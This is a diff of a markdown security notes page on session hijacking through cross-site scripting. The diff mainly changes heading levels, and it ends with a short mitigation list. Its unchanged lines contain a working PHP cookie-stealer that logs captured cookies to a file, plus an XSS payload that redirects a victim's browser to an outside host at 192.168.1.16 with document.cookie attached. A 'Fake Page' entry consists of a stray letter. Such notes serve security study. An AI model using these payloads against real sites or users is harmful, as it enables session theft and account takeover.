@@ -13,8 +13,8 @@
 
 
 ## Exploitation
-- Session Hijacking
-  - Cookie Stealer (PHP for Apache web server)
+#### Session Hijacking
+- Cookie Stealer (PHP for Apache web server)
 ```PHP
 <?php
 $Cookie=$_GET[‘txt’];
@@ -23,14 +23,14 @@ $f=fopen(“log.txt”,”a”);
 fwrite($f,$log);
 ?>
 ```
-  - XSS Payload
+- XSS Payload
 ```javascript
 <script>window.location=”http://192.168.1.16/cookie1.php?txt=” + document.cookie;</script>
 ```
-- Fake Page
-  - g
+#### Fake Page
+- g
 
-- [BeEF](../Tools/beef.md)
+#### [BeEF](../Tools/beef.md)
 
 ## Mitigation
 - Minimize the usage of user input on html
